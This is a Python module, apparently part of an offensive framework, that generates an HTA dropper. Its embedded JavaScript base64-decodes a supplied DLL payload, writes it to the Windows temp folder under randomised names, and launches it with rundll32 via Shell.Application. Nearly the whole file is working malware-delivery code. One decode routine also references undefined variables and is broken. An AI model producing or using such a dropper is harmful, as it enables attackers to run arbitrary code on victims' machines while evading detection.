from modules.namegen import generate_random_name

def build_hta_file(b64_encoded_dll, dll_export_function):

    hta_template = """
<HTML>
    <HEAD>
    </HEAD>
    <BODY>
        <script language="javascript">
	    
	    var reader = function _callee5$(text) {

	    	if (!/^[a-z0-9+/]+={0,2}$/i.test(text) || text.length % 4 != 0) {

	        	throw Error("failed");

	    	}

		    var o1;
		    var o2;
		    var o3;
		    var o;
		    var i;
		    var a;
		    var key_string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
		    var tmp_arr = [];
		    var start = 0;

		    for (; start < text.length; start = start + 4) {
		        	o1 = (a = key_string.indexOf(text.charAt(start)) << 18 | key_string.indexOf(text.charAt(start + 1)) << 12 | (o = key_string.indexOf(text.charAt(start + 2))) << 6 | (i = key_string.indexOf(text.charAt(start + 3)))) >>> 16 & 255;
		        	o2 = a >>> 8 & 255;
		        	o3 = 255 & a;
		        	tmp_arr[start / 4] = String.fromCharCode(o1, o2, o3);
		        	if (64 == i) {
		            	tmp_arr[start / 4] = String.fromCharCode(o1, o2);
		        	}
		        	if (64 == o) {
		            	tmp_arr[start / 4] = String.fromCharCode(o1);
		        	}
		    }
		    return text = tmp_arr.join("");
		};

		var REPLACE_WITH_FUNCTION_NAME1 = function parseSequence(url, length) {
		    var placeholder = reader(url);
		    var a = new ActiveXObject("ADODB.Stream");
		    a.Type = 2;
		    a.charSet = "iso-8859-1";
		    a.Open();
		    a.WriteText(placeholder);
		    var bs = new ActiveXObject("ADODB.Stream");
		    bs.Type = 1;
		    bs.Open();
		    a.Position = 0;
		    a.CopyTo(bs);
		    bs.SaveToFile(length, 2);
		    bs.Close();
		};


		var temp_folder_var = new ActiveXObject("Scripting.FileSystemObject");
		var temp_folder = temp_folder_var.GetSpecialFolder(2);
	
		var reverser = {
		    key_string2: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
		    decode: function decode(str) {
		        reverser.key_string2;
		        var stringOutput = "";
		        var index = 0;
		        do {
		            var chr1 = str.charCodeAt(index++);
		            var chr2 = str.charCodeAt(c++);
		            var chr3 = a.charCodeAt(c++);

		            var _m1 = (e = e || 0) >> 2 & 63;
		            var _m2 = (3 & e) << 4 | (t = t || 0) >> 4 & 15;
		            var _m3 = (15 & t) << 2 | (h = h || 0) >> 6 & 3;
		            var _m4 = 63 & h;

		            if (t) {
		                if (!h) {
		                    _m4 = 64;
		                }
		            } else {
		                _m3 = _m4 = 64;
		            }
		            stringOutput = stringOutput + (reverser.key_string2.charAt(_m1) + reverser.key_string2.charAt(_m2) + reverser.key_string2.charAt(_m3) + reverser.key_string2.charAt(_m4));
		        } while (c < a.length);

		        return stringOutput;
		    }
		};

		REPLACE_WITH_B_64_PAYLOAD_HERE

		REPLACE_WITH_FUNCTION_NAME1(payload, temp_folder + "\\REPLACE_WITH_RANDOM_DLL_NAME.dll");
		
		var executer = new ActiveXObject("Shell.Application");

		params = temp_folder + "\\REPLACE_WITH_RANDOM_DLL_NAME.dll,REPLACE_WITH_DLL_EXPORT_FUNCTION";
		executer.ShellExecute("rundll32.exe", params, "", "", 1);

	</script>
    </BODY>
</HTML>

"""

    hta_template = hta_template.replace("REPLACE_WITH_FUNCTION_NAME1", generate_random_name())
    hta_template = hta_template.replace("REPLACE_WITH_B_64_PAYLOAD_HERE", b64_encoded_dll)
    hta_template = hta_template.replace("REPLACE_WITH_DLL_EXPORT_FUNCTION", dll_export_function)
    hta_template = hta_template.replace("REPLACE_WITH_RANDOM_DLL_NAME", generate_random_name())

    return hta_template